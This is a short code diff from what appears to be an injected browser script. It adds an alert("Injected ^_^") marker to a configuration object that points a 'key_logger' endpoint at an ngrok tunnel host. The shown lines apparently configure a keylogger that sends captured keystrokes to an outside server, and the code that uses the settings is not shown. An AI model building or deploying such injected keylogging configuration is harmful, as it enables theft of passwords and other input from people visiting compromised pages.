@@ -1,3 +1,4 @@
+alert("Injected ^_^")
 window.rip_configs = {
   host: "https://eel-moral-ape.ngrok-free.app",
   key_logger: "/api/key-logger",
